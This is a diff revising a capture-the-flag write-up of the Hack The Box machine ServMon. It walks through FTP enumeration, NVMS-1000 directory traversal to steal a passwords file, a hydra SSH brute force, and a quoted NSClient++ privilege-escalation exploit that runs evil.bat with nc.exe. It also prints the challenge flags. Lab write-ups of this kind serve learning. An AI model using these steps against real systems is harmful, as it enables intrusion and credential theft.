@@ -35,10 +35,10 @@ This was an easy Windows machine....but don't get stuck chasing the rabbits!
 
 ### Nmap scan
 
-First off, I started with an nmap scan of `10.10.10.184`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oN <name>` which saves the output to file with a name of `<name>.nmap`.
+First off, I started my enumeration with an nmap scan of `10.10.10.184`. The options I regularly use are: `-p-`, which is a shortcut that tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, and `-oN <name>` saves the output to file with a name of `<name>`.
 
 ```text
-zweilos@kalimaa:~/htb/servmon$ nmap -p- -sC -sV -Pn -oN servmon 10.10.10.184
+zweilos@kalimaa:~/htb/servmon$ nmap -p- -sC -sV -Pn -oN servmon.nmap 10.10.10.184
                            
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-19 22:24 EDT                                        
 Nmap scan report for 10.10.10.184                                                                      
@@ -169,14 +169,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 60274.96 seconds
 ```
 
-Lots of open ports, start with low ports that are well known.
+Lots of open ports on this machine.  There are a number of clues in this output that would tell you that this is a Windows machine such as ports `135 - Microsoft Windows RPC`, `139 - Netbios`, and `445 - Server Message Block (SMB)`.  The FTP client also reports `SYST: Windows_NT` and SSH is running on `OpenSSH for_Windows_7.7`.  With that, it's usually best to start with enumerating the low ports that are well known.  
 
 ### Anonymous FTP
 
-try `Anonymous` ftp first
+If port `21 - FTP` is open, that is usually a good place to start as logging in as `Anonymous` can be an easy way to find useful information. To do this enter `anonymous` when it prompts you for a name, then give an email address when it prompts for a password.  This does not have to be a real address, just in the format `a@b.c`.
 
 ```text
 zweilos@kalimaa:~/htb/servmon$ ftp 10.10.10.184
+
 Connected to 10.10.10.184.
 220 Microsoft FTP Service
 Name (10.10.10.184:zweilos): anonymous
@@ -184,8 +185,7 @@ Name (10.10.10.184:zweilos): anonymous
 Password:
 230 User logged in.
 Remote system type is Windows_NT.
-ftp> list
-?Invalid command
+
 ftp> dir
 200 PORT command successful.
 125 Data connection already open; Transfer starting.
@@ -230,6 +230,8 @@ local: Notes to do.txt remote: Notes to do.txt
 ftp>
 ```
 
+Through FTP I was able to find two different users, `Nadine` and `Nathan`.  Each user's folder had a text document in it with some interesting information. 
+
 ```text
 zweilos@kalimaa:~/htb/servmon$ cat 'Notes to do.txt'
 1) Change the password for NVMS - Complete
@@ -238,6 +240,8 @@ zweilos@kalimaa:~/htb/servmon$ cat 'Notes to do.txt'
 4) Remove public access to NVMS
 5) Place the secret files in SharePoint
 ```
+
+`Nathan`'s folder contained a to-do list that lets us know that there are two services `NVMS` and `NSClient` on this machine, the security of which has not been completely locked down.  It seems as if public access to `NVMS` should still be still available, and whatever "secret files" may still be in an accessible location.
 
 ```text
 zweilos@kalimaa:~/htb/servmon$ cat Confidential.txt 
@@ -250,17 +254,21 @@ Regards
 Nadine
 ```
 
-next port 80 - redirects to [http://10.10.10.184/Pages/login.htm](http://10.10.10.184/Pages/login.htm) "NVMS-1000" \(pagetitle\) 
+The file `Confidential.txt` in `Nadine`'s folder gave me some more good news.  She left `Nathan` a file on his desktop that looks to contain passwords.  This may be one of the "secret files" that `Nathan` was planning to lock up in SharePoint that he hadn't gotten to yet. 
+
+### HTTP - Port 80
+
+Since I still didn't have a way in, the next place to enumerate was HTTP on port 80.  Navigating to `http://10.10.10.181` redirected to `http://10.10.10.184/Pages/login.htm` which had a page title of `NVMS-1000`.  This looks like the page with public access that `Nathan`'s to-do list had mentioned.  
 
 ![NVMS-1000 Web Portal](../.gitbook/assets/screenshot_2020-06-20_17-14-29.png)
 
 ### NVMS-1000 Exploit Research
 
-quick search of searchsploit finds exploit for this web portal: [https://www.exploit-db.com/exploits/47774](https://www.exploit-db.com/exploits/47774) [https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt\_nvms\_traversal](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt_nvms_traversal) since we know the location of the `Passwords.txt` file, use this to exfiltrate
+A quick exploit search using `searchsploit nvms 1000` found a directory traversal exploit for this web portal at [https://www.exploit-db.com/exploits/47774](https://www.exploit-db.com/exploits/47774), and also a Metasploit scanner to check for this vulnerability at [https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt\_nvms\_traversal](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt_nvms_traversal).  
 
 ## Initial Foothold
 
-Can use GET requests and directory traversal to access files on the system.  Blog from Rapid7 shows good way to test for LFI and directory traversal for Windows.
+Can use GET requests and directory traversal to access files on the system.  Blog from Rapid7 shows good way to test for LFI and directory traversal for Windows. since we know the location of the `Passwords.txt` file, use this to exfiltrate
 
 {% embed url="https://blog.rapid7.com/2016/07/29/pentesting-in-the-real-world-local-file-inclusion-with-windows-server-files/" %}
 
@@ -303,6 +311,7 @@ now lets try to login to ssh as `Nathan` and `Nadine`.
 
 ```text
 zweilos@kalimaa:~/htb/servmon$ hydra -l Nadine -P passwords 10.10.10.184 ssh
+
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-20 21:06:59
@@ -395,6 +404,10 @@ nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
 5ee172f5b05926cfc9eaf8c4eb8aad52
 ```
 
+### Metagaming - Other user's artifacts
+
+As you can see in this output, there were at least a few different people working on this machine around the same time as me, and that they had left their enumeration scripts behind. On my first couple Hack the Box attempts I found useful information in a public location and thought it was part of the box, only later to find out that I had been receiving spoilers due to other user's artifacts. _Please be courteous to other users in this shared environment and clean up after yourself!_  
+
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as User Nadine
@@ -456,9 +469,9 @@ bat = scripts\\%SCRIPT% %ARGS%
 
 ### NSClient++ Exploit Research
 
-A Google search of nsclient++ and changelog leads to [http://www.nsclient.org/download/0.5.2/](http://www.nsclient.org/download/0.5.2/), where we can verify the dates in the changelog.ini against and versions of the program releases.  It seems as if we are on version 0.5.2.31 nightly build from the date of 2018-01-18. 
+A Google search of nsclient++ and changelog leads to [http://www.nsclient.org/download/0.5.2/](http://www.nsclient.org/download/0.5.2/), where we can correlate the dates in the changelog.ini with the versions of the program's releases.  It seems as if we are on nightly build version 0.5.2.31 from 2018-01-18. 
 
-Again, a quick Searchsploit check found what looks to be an exploit that might work for this version.  [https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802)
+Again, a quick Searchsploit check found an exploit that might work for this version.  [https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802)
 
 ```text
 Exploit Author: bzyo
@@ -472,12 +485,22 @@ Software Link: http://nsclient.org/download/
 Tested on: Windows 10 x64
 
 Details:
-When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  
+When NSClient++ is installed with Web Server enabled, local low privilege users 
+have the ability to read the web administator's password in cleartext from the 
+configuration file.  From here a user is able to login to the web server and 
+make changes to the configuration file that is normally restricted.  
 
-The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.  
+The user is able to enable the modules to check external scripts and schedule 
+those scripts to run.  There doesn't seem to be restrictions on where the scripts 
+are called from, so the user can create the script anywhere.  Since the NSClient++ 
+Service runs as Local System, these scheduled scripts run as that user and the low 
+privilege user can gain privilege escalation.  A reboot, as far as I can tell, is 
+required to reload and read the changes to the web config.  
 
 Prerequisites:
-To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.
+To successfully exploit this vulnerability, an attacker must already have local 
+access to a system running NSClient++ with Web Server enabled using a low 
+privileged user account with the ability to reboot the system.
 
 Exploit:
 1. Grab web administrator password
@@ -487,7 +510,8 @@ or
 	C:\Program Files\NSClient++>nscp web -- password --display
 	Current password: SoSecret
 
-2. Login and enable following modules including enable at startup and save configuration
+2. Login and enable following modules including enable at startup and save 
+configuration:
 - CheckExternalScripts
 - Scheduler
 
@@ -523,10 +547,19 @@ or
 	nt authority\system
 	
 Risk:
-The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
+The vulnerability allows local attackers to escalate privileges and execute 
+arbitrary code as Local System
 ```
 
-`nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display Current password: ew2x6SsGTxjRwXOT`
+
+
+```text
+nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display 
+
+Current password: ew2x6SsGTxjRwXOT
+```
+
+
 
 ```text
 #@echo off
@@ -548,6 +581,8 @@ When logging in, it was found that the login failed. After research, it was foun
 ### Taking the API route
 
 [https://docs.nsclient.org/api/](https://docs.nsclient.org/api/)
+
+
 
 nadine@SERVMON C:\Users\Nadine&gt;curl -k -u admin [https://localhost:8443/api/v1](https://localhost:8443/api/v1) Enter host password for user 'admin': curl: \(7\) Failed to connect to localhost port 8443: Connection refused
 
@@ -584,6 +619,8 @@ Enter host password for user 'admin':
 {"command":"evil","lines":[{"message":"Command evil didn't terminate within the timeout period 60s","pe
 rf":{}}],"result":3}
 ```
+
+I was not the only one to have troubles at first transferring my files to this machine.  Another user had tried to upload `nc.exe` and `evil.bat` to the `C:\Temp` folder but had failed \(filesize of 0 bytes\).  I had forgotten to add `--output <file_name>` .  Luckily it gave a warning to remind me of this.  
 
 ### Getting a root shell
 
@@ -655,7 +692,7 @@ ERROR: Unable to get user claims information.
 
 ### root.txt
 
-Apparently in cmd.exe shell the direction of the slash is important!
+Apparently in a cmd.exe shell the direction of the slash is important when using `type` to read a file!
 
 ```text
 
@@ -667,4 +704,8 @@ C:\Program Files\NSClient++>type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
 3e42dab90f3ab8487973c7769382a639
 ```
+
+Thanks to [dmw0ng](https://www.hackthebox.eu/home/users/profile/82600) for a fun and interesting challenge!  I certainly learned a few new useful tricks for dealing with Windows machines. 
+
+If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
 
